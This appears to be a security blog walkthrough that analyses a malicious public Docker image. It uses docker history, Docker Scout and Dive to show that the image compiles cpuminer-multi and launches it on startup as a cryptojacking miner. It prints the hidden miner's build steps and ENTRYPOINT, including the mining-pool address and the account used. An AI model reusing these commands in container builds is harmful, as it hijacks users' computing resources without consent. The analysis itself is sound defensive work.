# Investigating a Malicious Docker Image  

When analyzing a potentially malicious Docker image like `ynprpagamentitk/liferay`, the first step is to inspect its Docker history. This helps us understand how the image was built, layer by layer, and identify any suspicious modifications.  

## Examining the Image Layers  

We start by running the following command:  

```bash
docker history ynprpagamentitk/liferay
```  

This reveals a series of layers that give us insight into the image’s construction. Below is a truncated version of the output:  

```
IMAGE        CREATED BY                                      SIZE  
090c15b354ad /bin/sh -c #(nop) ENTRYPOINT ["/bin/minerd"... 0B  
<missing>    /bin/sh -c chmod 755 /bin/minerd               179kB  
<missing>    /bin/sh -c #(nop) ADD file:afde9ecdee7c...     179kB  
<missing>    /bin/sh -c #(nop) WORKDIR /cpuminer-multi      0B  
<missing>    /bin/sh -c cd cpuminer-multi && ...           2.1MB  
<missing>    /bin/sh -c git clone https://github.com/Oh... 1.05MB  
<missing>    /bin/sh -c apt-get update -qq && ...         317MB  
```  

From this, we can already spot some red flags. The image installs various build tools, downloads and compiles `cpuminer-multi`, and ultimately deploys a binary called `minerd`. The presence of an `ENTRYPOINT` configured to launch `minerd` automatically suggests that this container is designed for cryptojacking—using system resources to mine cryptocurrency without user consent.  

## Understanding the Base Image  

To better understand the image, we need to determine which base operating system it was built on. Using **Docker Scout**, we identify that the image is based on `ubuntu:xenial-20170510`. This is an important finding because it means the initial layers of the container should match those from the official Ubuntu base image.  

To confirm this, we analyze the early layers of the container:  

```
IMAGE        CREATED BY                                      SIZE  
ebcd9d4fca80 /bin/sh -c #(nop) CMD ["/bin/bash"]            0B  
<missing>    /bin/sh -c mkdir -p /run/systemd && echo '...  7B  
<missing>    /bin/sh -c sed -i 's/^#\s*\(deb.*universe\)... 2.76kB  
<missing>    /bin/sh -c rm -rf /var/lib/apt/lists/*        0B  
<missing>    /bin/sh -c set -xe && echo '#!/bin/sh' >...  745B  
<missing>    /bin/sh -c #(nop) ADD file:d14b493577228a4... 118MB  
```  

By comparing these layers with the known Ubuntu `xenial-20170510` image, we see that the first six layers match exactly. This confirms that the base image is unmodified and that these optimizations—such as disabling auto-starting services, enabling extra package sources, and removing cached package lists—are simply standard Ubuntu container adjustments.  

## Investigating Suspicious Additions  

One of the more mysterious elements in this image is the `ADD` command, which introduces a file labeled `file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c`. To determine what changes this file made, we used the **Dive** tool, which revealed that it modified multiple system directories, including:  

- `/bin`  
- `/etc`  
- `/lib`  
- `/root`  
- `/run`  
- `/sbin`  
- `/usr`  
- `/var`  

At first, these modifications raised concerns about potential malicious activity. However, after further inspection, we found that these were typical optimizations made to improve container performance and were not introducing malware.  

## Source Code and Binary Injection  

The final layers of the Docker image give us the clearest indication of its malicious intent:  

```bash
/bin/sh -c #(nop) ENTRYPOINT ["/bin/minerd" "-a" "cryptonight" \
"-o" "stratum+tcp://xmr.pool.minergate.com:45560" "-u" "trudly@outlook.com" "-p" "x" "-t" "1"]
/bin/sh -c chmod 755 /bin/minerd
/bin/sh -c #(nop) ADD file:afde... in /bin/minerd
/bin/sh -c #(nop) WORKDIR /cpuminer-multi
/bin/sh -c cd cpuminer-multi && ./autogen.sh && \
CFLAGS="-march=native" ./configure && make
/bin/sh -c git clone https://github.com/OhGodAPet/cpuminer-multi
```  

Here's what happens in this sequence:  

1. **Dependencies Installed** – The image installs required packages and tools.  
2. **Repository Cloned** – It clones the `cpuminer-multi` repository from GitHub.  
3. **Compilation** – The miner is compiled using CPU-specific optimizations.  
4. **Binary Injection** – The compiled binary is explicitly added to `/bin/minerd`.  
5. **Execution Setup** – The container is configured to automatically run `minerd` upon startup, connecting it to a Monero mining pool.  

Interestingly, the original repository (`https://github.com/OhGodAPet/cpuminer-multi`) no longer exists. However, a search for similar repositories led us to `https://github.com/tpruvot/cpuminer-multi`, which shares the same name and command-line arguments.  

## Conclusion  

From our investigation, it’s clear that this container was specifically designed for cryptojacking. The attacker built the image to install, compile, and run a Monero miner inside a container, then uploaded it to a public registry under a misleading name. The clever use of an `ENTRYPOINT` ensures that the miner starts automatically whenever the container is run, effectively hijacking system resources for unauthorized cryptocurrency mining.  

This case highlights why security teams must be cautious when pulling images from public registries. Always inspect Docker history, scan images for vulnerabilities, and verify the source before deploying third-party containers in production environments.  